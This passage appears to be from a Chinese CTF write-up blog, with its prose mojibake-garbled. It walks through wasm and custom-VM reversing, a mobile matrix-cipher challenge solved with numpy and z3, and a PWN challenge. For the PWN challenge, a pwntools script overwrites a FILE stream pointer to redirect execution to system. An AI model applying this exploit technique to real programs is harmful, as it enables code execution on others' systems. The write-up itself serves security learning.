(*Z_envZ_table).data[offset + 1] = (wasm_rt_elem_t)&#123;func_types[1], (wasm_rt_anyfunc_t)(&amp;_to_bytes)&#125;; (*Z_envZ_table).data[offset + 2] = (wasm_rt_elem_t)&#123;func_types[2], (wasm_rt_anyfunc_t)(&amp;_to_int32)&#125;; (*Z_envZ_table).data[offset + 3] = (wasm_rt_elem_t)&#123;func_types[3], (wasm_rt_anyfunc_t)(&amp;_memcpy)&#125;; (*Z_envZ_table).data[offset + 4] = (wasm_rt_elem_t)&#123;func_types[3], (wasm_rt_anyfunc_t)(&amp;_memset)&#125;; (*Z_envZ_table).data[offset + 5] = (wasm_rt_elem_t)&#123;func_types[3], (wasm_rt_anyfunc_t)(&amp;_memcmp)&#125;; (*Z_envZ_table).data[offset + 6] = (wasm_rt_elem_t)&#123;func_types[2], (wasm_rt_anyfunc_t)(&amp;_strlen)&#125;; (*Z_envZ_table).data[offset + 7] = (wasm_rt_elem_t)&#123;func_types[4], (wasm_rt_anyfunc_t)(&amp;_md5)&#125;; (*Z_envZ_table).data[offset + 8] = (wasm_rt_elem_t)&#123;func_types[2], (wasm_rt_anyfunc_t)(&amp;_check)&#125;; (*Z_envZ_table).data[offset + 9] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 10] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 11] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 12] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 13] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 14] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 15] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;;&#125;...void WASM_RT_ADD_PREFIX(init)(void) &#123; init_func_types(); init_globals(); init_memory(); init_table(); init_exports();&#125; è½¬æ¢æˆcä»£ç åï¼Œå®¡è®¡èµ·æ¥è¿˜æ˜¯å¾ˆç´¯ã€‚æ”¾ä¸€ä¸‹pizzaå¤§ä½¬çš„è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import hashlibt = ['562fe3cc50014c260d9e8cf4ed38c77a','c022ad0cc0075a9ab14b412a1082d5f3','64c286cfc623aa8d7df7c088ebf7d718','83664bdee4b613b7e7a51b5213470a8d','b020bf598aaa2b3e03ed02c85436268a','4fdac5ac807506938103e775c50099ed','4fdac5ac807506938103e775c50099ed','c231d607b6823fd0a68e813760809754','d168c21d10371a5ab61bcfe6c759ef6e','f60d709ccf989d849028f97a03d2f3ba','a0184f8240e2fe46861dc8d15a819cb0','9dbec414336e741e9c73422df59de297','6fb5209d8fc8bb8507245bcfa24ae11f','6fb5209d8fc8bb8507245bcfa24ae11f','00c77fbc60a5bfc466d3d069876ec348','00c77fbc60a5bfc466d3d069876ec348','df33464fb471c46abaf691c000a0e30d','4fdac5ac807506938103e775c50099ed','f60d709ccf989d849028f97a03d2f3ba','fcc94a20596f2619868f3a4bf52eadf7','00c77fbc60a5bfc466d3d069876ec348','d168c21d10371a5ab61bcfe6c759ef6e','9dbec414336e741e9c73422df59de297','fcc94a20596f2619868f3a4bf52eadf7','9b37db091979bedf00a7095851ba6f59','00c77fbc60a5bfc466d3d069876ec348','f60d709ccf989d849028f97a03d2f3ba','fcc94a20596f2619868f3a4bf52eadf7','d168c21d10371a5ab61bcfe6c759ef6e','f60d709ccf989d849028f97a03d2f3ba','183342997ffed4b3189e977d077a60b4','f404a3368d2d8f57464f739d4ed01c0e']flag = ''for i in range(32): c = 0 for ch in range(32, 127): x = hashlib.md5('2333333333333333333333333333333' + chr(ch)).digest() x = x.encode('hex').lower() x = hashlib.md5(x).digest() x = x.encode('hex').lower() if(x == t[i]): c = ch break assert(c != 0) flag += chr(c)print flag EASYVMç¬¬ä¸€æ¬¡åšçš„æ—¶å€™æ‰‹æ’¸ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012020x05, 0x01, 0x0B, // mov r1, rB0x13, 0x03, 0x03, // xor r3, r30x13, 0x00, 0x00, // xor r0, r00x13, 0x04, 0x04, // xor r4, r4r1 = rB;r3 = r0 = r4 = 0;0x28, // enter the looploop:0x0C, 0x00, 0x33, // add r0, 0x330x14, 0x00, 0x20, // mov r0, r0 mod 0x200x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x00, // add_pch r9, r00x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x04, 0x0A, // mov r4, rA0x1B, 0x05, 0x04, // push r5, r40x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r0 += 0x33; r0 = r0 % 0x20; r9 = r1; r9 += r0; rA = r9; r4 = rA; r5 = r4 + 1; r3 += 0x01; if(r3 &gt;= 0x20) break;&#125;0x13, 0x00, 0x00, // xor r0, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x01, 0x04, 0x00, // mov r4, r00x13, 0x03, 0x03, // xor r3, r3r0 = 0;r8 = r5;r8 += 0xE0;r2 = r8;rA = r2;r0 = rA;r0 &amp;= 0xE0;r0 &gt;&gt;= 0x05;r0 &amp;= 0xFF;r4 = r0;r3 = 0;0x28, // enter the looploop:0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x1D, 0x05, 0x0A, // pop r5, rA0x0D, 0x0A, 0x00, // add rA, r00x1B, 0x05, 0x0A, // push r5, rA0x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x1F, // cmpl r3, 0x1F0x28, // jl loopwhile(1) // loop 0x1F times&#123; rA = r2; r0 = rA; r0 &amp;= 0x1F; r0 &lt;&lt;= 0x03; r0 &amp;= 0xFF; r5 = r0 + 1; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r0 &amp;= 0xE0; r0 &gt;&gt;= 0x05; r0 &amp;= 0xFF; rA = r5 - 1; rA += r0; r5 = rA + 1; r3 += 1; if(r3 &gt;= 0x1F) break;&#125;0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x0D, 0x00, 0x04, // add r0, r40x1B, 0x05, 0x00, // push r5, r00x13, 0x03, 0x03, // xor r3, r30x03, 0x04, 0x0D, // mov, r4, rD // 0xEFBEADDE0x28, // enter the looprA = r2;r0 = rA;r0 &amp;= 0x1F;r0 &lt;&lt;= 0x03;r0 &amp;= 0xFF;r0 += r4;r5 = r0 + 1;r3 = 0;r4 = rD;loop:0x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x1B, 0x05, 0x00, // push r5, r00x01, 0x00, 0x04, // mov r0, r40x0D, 0x00, 0x03, // and r0, r30x1D, 0x05, 0x0A, // pop r5, rA0x13, 0x0A, 0x00, // xor rA, r00x1B, 0x05, 0x0A, // push r5, rA0x22, 0x04, 0x08, // ror r4, 0x080x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r5 = r0 + 1; r0 = r4; r0 += r3; rA = r5 - 1; rA ^= r0; r5 = rA + 1; r4 = (1 &lt;&lt; 8 - 1) &amp; (r4 &lt;&lt; 24) + ((1 &lt;&lt; 24 - 1) &amp; (r4 &gt;&gt; 8)); r3 += 1; if(r3 &gt;= 0x20) break;&#125;0x13, 0x03, 0x03, // xor r3, r30x13, 0x04, 0x04, // xor r4, r40x05, 0x01, 0x0C, // mov r1, rC // enc0x28, // enter the loopr3 = r4 = 0;r1 = rC;loop:0x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x03, // add_pch r9, r30x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x00, 0x0A, // mov r0, rA0x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xDF, // add r8, 0xDF0x09, 0x0A, 0x08, // ldr_int rA, r80x1D, 0x05, 0x00, // pop r5, r00x1B, 0x05, 0x00, // push r5, r00x27, 0x00, 0x0A, // cmpeq r0, rA0x17, 0x04, 0x07, // mov r4, r4 | r70x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28 // jl loopwhile(1) // loop 0x20 times&#123; r9 = r1; r9 += r3; rA = r9; r0 = rA; r5 = r0 + 1; r8 = r5; r8 += 0xDF; rA = r8; r0 = r5 - 1; r5 = r0 + 1; r0 != rA r4 |= r7; r3 += 1; if(r3 &gt;= 0x20) break;&#125; å…¶å®è¿˜æ˜¯æŒºæ¸…æ¥šçš„ï¼Œå¯ä»¥é€†å‡ºæ¥ã€‚è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718192021# reverse step3enc1 = [0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF]key = [0xDE, 0xAD, 0xBE, 0xEF]enc2 = [enc1[i] ^ ((key[i % 4] + i) &amp; 0xFF) for i in range(32)]# reverse step2enc3 = [0 for i in range(32)]def f(a, b): return ((a &lt;&lt; 5) &amp; 0xE0 | (b &gt;&gt; 3) &amp; 0x1F)for i in range(1, 32): enc3[i] = f(enc2[i - 1], enc2[i])enc3[0] = f(enc2[31], enc2[0])# reverse step1enc4 = [0 for i in range(32)]j = 0for i in range(32): j += 0x33 enc4[j % 0x20] = enc3[i]flag = ''for ch in enc4: flag += chr(ch)print flag ä¹‹åæœ‰ç©ºæ‰“ç®—é‡æ–°ç”¨è„šæœ¬æ¥æ•´ç†ä¸€ä¸‹ PWNChallenge1åˆ©ç”¨äº†_IO_FILEçš„ç›¸å…³æ¼æ´ï¼Œå’Œä¹‹å‰ä¸€é“ç»ƒä¹ é¢˜å¾ˆç±»ä¼¼ï¼š 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int c; // [rsp+Ch] [rbp-4h] stream = fopen(\"test.txt\", \"r\"); init_func(); while ( 1 ) &#123; while ( 1 ) &#123; putchar('&gt;'); c = readline(); if ( c != 1 ) break; get_s(); &#125; if ( c != 2 ) break; put_s(); &#125; if ( c == 3 ) close_stream(); return 0LL;&#125; è¾“å…¥çš„så¯ä»¥è¦†ç›–æ‰streamæŒ‡é’ˆï¼Œåç§»æ˜¯0x100ã€‚ 1234.bss:00000000006010C0 s db 100h dup(?) ; DATA XREF: get_s+4â†‘o.bss:00000000006010C0 ; put_s+4â†‘o.bss:00000000006011C0 ; FILE *stream.bss:00000000006011C0 stream dq ? ; DATA XREF: close_stream+4â†‘r å…³äº_IO_FILEä¸€äº›symbolåœ¨gdbé‡Œå¯ä»¥çœ‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263assassinq&gt;&gt; p sizeof(FILE)$1 = 0xd8assassinq&gt;&gt; p sizeof(struct _IO_FILE_plus)$2 = 0xe0assassinq&gt;&gt; p *(struct _IO_FILE_plus *)stdin$3 = &#123; file = &#123; _flags = 0xfbad208b, _IO_read_ptr = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;\\n&quot;, _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dcc2a0 &lt;_IO_file_jumps&gt;&#125;assassinq&gt;&gt; p *((struct _IO_FILE_plus *)stdin).vtable$4 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7a70330 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a71300 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a71020 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a723c0 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a73c50 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a6f930 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a6f590 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a6eb90 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a72990 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a6e850 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a6e6d0 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a62100 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a6f910 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a6f190 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a6e910 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a6e840 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a6f180 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a73dd0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a73de0 &lt;_IO_default_imbue&gt;&#125; è„šæœ¬ï¼š 123456789101112131415161718192021222324#!/usr/bin/env pythonfrom pwn import *binary = './task_challenge1'elf = ELF(binary)context.log_level = 'debug'context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']local = 1if local: p = process(binary)else: p = remote('202.112.51.184', 30003)ub_offset = 0x3c4b30p.sendlineafter('&gt;', '1')gdb.attach(p)buf_addr = 0x6010C0system = 0x400897payload = ( ((('\\0' * 0x10 + p64(system) + '\\0' * 70).ljust(0x88,'\\0') + p64(buf_addr)).ljust(0xd8, '\\0') + p64(buf_addr)).ljust(0x100, '\\0') + p64(buf_addr))p.sendline(payload)p.sendlineafter('&gt;', '3')p.interactive() MOBILESWAGæ‹–è¿›jadxï¼Œç›´æ¥çœ‹Mainactivityä¸­çš„å‡½æ•°ï¼Œå¯ä»¥çŸ¥é“å¯¹è¾“å…¥æ•°æ®è¿›è¡Œäº†é•¿åº¦çš„åˆ¤æ–­å’Œå†…å®¹çš„æ­£åˆ™åˆ¤æ–­ã€‚ç„¶åè¿˜å­˜åœ¨nativeå±‚ï¼Œéœ€è¦å¯¹soæ–‡ä»¶åˆ†æã€‚ åœ¨idaé‡Œèƒ½çœ‹å‡ºç»è¿‡ä¸¤æ¬¡åŠ å¯†è¿‡ç¨‹ï¼Œä»”ç»†å‘ç°å…¶å®æ˜¯çŸ©é˜µçš„ä¸€äº›æ“ä½œï¼Œå…ˆå¯¹çŸ©é˜µè½¬ç½®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101char **__fastcall matrix_transpos(char **matrix)&#123; char *v1; // x8 char *v2; // x11 char *v3; // x8 char *v4; // x8 char *v5; // x8 char *v6; // x8 char *v7; // x8 char *v8; // x9 char *v9; // x8 char *v10; // x9 char *v11; // x8 char *v12; // x9 char *v13; // x8 char *v14; // x9 char *v15; // x8 char *v16; // x9 char *v17; // x8 char *v18; // x9 char *v19; // x8 char *v20; // x9 char *v21; // x8 char *v22; // x9 char *v23; // x8 char *v24; // x9 char *v25; // x8 char *v26; // x9 v1 = matrix[1]; LODWORD(v2) = *((_DWORD *)*matrix + 1); *((_DWORD *)*matrix + 1) = *(_DWORD *)v1; *(_DWORD *)v1 = (_DWORD)v2; v3 = matrix[2]; LODWORD(v2) = *((_DWORD *)*matrix + 2); *((_DWORD *)*matrix + 2) = *(_DWORD *)v3; *(_DWORD *)v3 = (_DWORD)v2; v4 = matrix[3]; LODWORD(v2) = *((_DWORD *)*matrix + 3); *((_DWORD *)*matrix + 3) = *(_DWORD *)v4; *(_DWORD *)v4 = (_DWORD)v2; v5 = matrix[4]; LODWORD(v2) = *((_DWORD *)*matrix + 4); *((_DWORD *)*matrix + 4) = *(_DWORD *)v5; *(_DWORD *)v5 = (_DWORD)v2; v6 = matrix[5]; LODWORD(v2) = *((_DWORD *)*matrix + 5); *((_DWORD *)*matrix + 5) = *(_DWORD *)v6; *(_DWORD *)v6 = (_DWORD)v2; v8 = matrix[1]; v7 = matrix[2]; LODWORD(v2) = *((_DWORD *)v8 + 2); *((_DWORD *)v8 + 2) = *((_DWORD *)v7 + 1); *((_DWORD *)v7 + 1) = (_DWORD)v2; v9 = matrix[3]; v10 = matrix[1]; LODWORD(v2) = *((_DWORD *)v10 + 3); *((_DWORD *)v10 + 3) = *((_DWORD *)v9 + 1); *((_DWORD *)v9 + 1) = (_DWORD)v2; v11 = matrix[4]; v12 = matrix[1]; LODWORD(v2) = *((_DWORD *)v12 + 4); *((_DWORD *)v12 + 4) = *((_DWORD *)v11 + 1); *((_DWORD *)v11 + 1) = (_DWORD)v2; v13 = matrix[5]; v14 = matrix[1]; LODWORD(v2) = *((_DWORD *)v14 + 5); *((_DWORD *)v14 + 5) = *((_DWORD *)v13 + 1); *((_DWORD *)v13 + 1) = (_DWORD)v2; v16 = matrix[2]; v15 = matrix[3]; LODWORD(v2) = *((_DWORD *)v16 + 3); *((_DWORD *)v16 + 3) = *((_DWORD *)v15 + 2); *((_DWORD *)v15 + 2) = (_DWORD)v2; v17 = matrix[4]; v18 = matrix[2]; LODWORD(v2) = *((_DWORD *)v18 + 4); *((_DWORD *)v18 + 4) = *((_DWORD *)v17 + 2); *((_DWORD *)v17 + 2) = (_DWORD)v2; v19 = matrix[5]; v20 = matrix[2]; LODWORD(v2) = *((_DWORD *)v20 + 5); *((_DWORD *)v20 + 5) = *((_DWORD *)v19 + 2); *((_DWORD *)v19 + 2) = (_DWORD)v2; v22 = matrix[3]; v21 = matrix[4]; LODWORD(v2) = *((_DWORD *)v22 + 4); *((_DWORD *)v22 + 4) = *((_DWORD *)v21 + 3); *((_DWORD *)v21 + 3) = (_DWORD)v2; v23 = matrix[5]; v24 = matrix[3]; LODWORD(v2) = *((_DWORD *)v24 + 5); *((_DWORD *)v24 + 5) = *((_DWORD *)v23 + 3); *((_DWORD *)v23 + 3) = (_DWORD)v2; v26 = matrix[4]; v25 = matrix[5]; LODWORD(v2) = *((_DWORD *)v26 + 5); *((_DWORD *)v26 + 5) = *((_DWORD *)v25 + 4); *((_DWORD *)v25 + 4) = (_DWORD)v2; return matrix;&#125; å†å°†ä¸¤ä¸ªçŸ©é˜µç›¸ä¹˜ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546char *__fastcall matrix_inverse(char *matrix, char *data)&#123; char *v2; // x19 char *v3; // x22 char *v4; // x20 char *v5; // x21 char *v6; // x0 __int64 i; // x8 char *v8; // x9 char *v9; // x10 __int64 j; // x11 v2 = matrix; v3 = data; v4 = (char *)malloc(48LL); v5 = (char *)malloc(24LL); *(_QWORD *)v4 = v5; *((_QWORD *)v4 + 1) = malloc(24LL); *((_QWORD *)v4 + 2) = malloc(24LL); *((_QWORD *)v4 + 3) = malloc(24LL); *((_QWORD *)v4 + 4) = malloc(24LL); v6 = (char *)malloc(24LL); i = 0LL; *((_QWORD *)v4 + 5) = v6; while ( 1 ) &#123; v9 = *(char **)&amp;v2[8 * i]; j = 0LL; do &#123; v8 = v3 + 72; *(_DWORD *)&amp;v5[j] = *(_DWORD *)&amp;v8[j - 72] * *(_DWORD *)v9 + *(_DWORD *)&amp;v8[j - 48] * *((_DWORD *)v9 + 1) + *(_DWORD *)&amp;v8[j - 24] * *((_DWORD *)v9 + 2) + *(_DWORD *)&amp;v8[j] * *((_DWORD *)v9 + 3) + *(_DWORD *)&amp;v8[j + 24] * *((_DWORD *)v9 + 4) + *(_DWORD *)&amp;v8[j + 48] * *((_DWORD *)v9 + 5); j += 4LL; &#125; while ( j != 24 ); if ( ++i == 6 ) break; v5 = *(char **)&amp;v4[8 * i]; &#125; return v4;&#125; é‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹ç”¨numpyå°±èƒ½è§£å‡ºæ¥ï¼Œè§£é¢˜è„šæœ¬ï¼š 12345678910111213141516171819202122232425from numpy import *enc = [ 0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [ 0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]trans_data = mat(data).reshape(6, 6)trans_enc = mat(enc).reshape(6, 6)trans = trans_enc * trans_data.Ires = trans.T.reshape(1, 36).tolist()[0]flag = ''for ch in res: flag += chr(int(round(ch)))print(flag) å› ä¸ºè¿˜æ²¡å­¦è¿‡çº¿ä»£ï¼Œè¿˜æ²¡çœ‹æ‡‚çš„æ—¶å€™ï¼Œç¡¬ç”Ÿç”Ÿç°å­¦ç°ç”¨z3æŠŠçŸ©é˜µæ±‚é€†çš„è¿‡ç¨‹è§£å‡ºæ¥äº†ï¼Œæ‰€ä»¥é¡ºä¾¿è´´ä¸€æ³¢ç°å­¦çš„z3è„šæœ¬ï¼š 123456789101112131415161718192021222324from z3 import *enc = [0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]i = 0res = ''while(1): s = Solver() n0 = Int('n0') n1 = Int('n1') n2 = Int('n2') n3 = Int('n3') n4 = Int('n4') n5 = Int('n5') s.add(enc[i * 6 + 0] == n0 * data[0] + n1 * data[6] + n2 * data[12] + n3 * data[18] + n4 * data[24] + n5 * data[30]) s.add(enc[i * 6 + 1] == n0 * data[1] + n1 * data[7] + n2 * data[13] + n3 * data[19] + n4 * data[25] + n5 * data[31]) s.add(enc[i * 6 + 2] == n0 * data[2] + n1 * data[8] + n2 * data[14] + n3 * data[20] + n4 * data[26] + n5 * data[32]) s.add(enc[i * 6 + 3] == n0 * data[3] + n1 * data[9] + n2 * data[15] + n3 * data[21] + n4 * data[27] + n5 * data[33]) s.add(enc[i * 6 + 4] == n0 * data[4] + n1 * data[10] + n2 * data[16] + n3 * data[22] + n4 * data[28] + n5 * data[34]) s.add(enc[i * 6 + 5] == n0 * data[5] + n1 * data[11] + n2 * data[17] + n3 * data[23] + n4 * data[29] + n5 * data[35]) s.check() print s.model() if i == 5: break i += 1 å‚è€ƒç½‘ç«™http://yugod.xmutsec.com/index.php/2018/08/10/42.htmlhttps://www.jianshu.com/p/028c0c6270c3https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Deehttps://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0https://www.jianshu.com/p/110f715c210f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"XMan PWNï¼ˆäº”ï¼‰","slug":"XMan-PWNï¼ˆäº”ï¼‰","date":"2018-08-09T01:08:59.000Z","updated":"2018-08-09T11:00:53.777Z","comments":true,"path":"2018/08/09/XMan-PWNï¼ˆäº”ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/09/XMan-PWNï¼ˆäº”ï¼‰/","excerpt":"swingå¤§ä½¬æ•™æ¼æ´æŒ–æ˜ï¼ˆVulnerability Discoveringï¼‰ã€‚","text":"swingå¤§ä½¬æ•™æ¼æ´æŒ–æ˜ï¼ˆVulnerability Discoveringï¼‰ã€‚ Data-Flow Analysisæ•°æ®æµåˆ†ææŒ‡çš„æ˜¯ä¸€ç»„ç”¨æ¥è·å–æœ‰å…³æ•°æ®å¦‚ä½•æ²¿ç€ç¨‹åºæ‰§è¡Œè·¯å¾„æµåŠ¨çš„ç›¸å…³ä¿¡æ¯çš„æŠ€æœ¯ã€‚ æ•°æ®æµåˆ†æçš„ç›®çš„æ˜¯æä¾›ä¸€ä¸ªè¿‡ç¨‹ï¼ˆæˆ–ä¸€å¤§æ®µç¨‹åºï¼‰å¦‚ä½•æ“çºµå™¨æ•°æ®çš„å…¨å±€ä¿¡æ¯ã€‚ æ ¹æ®å¯¹ç¨‹åºè·¯å¾„çš„åˆ†æç²¾åº¦åˆ†ç±» æµä¸æ•æ„Ÿåˆ†æï¼ˆflow insensitiveï¼‰ï¼šä¸è€ƒè™‘è¯­å¥çš„å…ˆåé¡ºåºï¼ŒæŒ‰ç…§ç¨‹åºè¯­å¥çš„ç‰©ç†ä½ç½®ä»ä¸Šå¾€ä¸‹é¡ºåºåˆ†ææ¯ä¸€è¯­å¥ æµæ•æ„Ÿåˆ†æï¼ˆflow 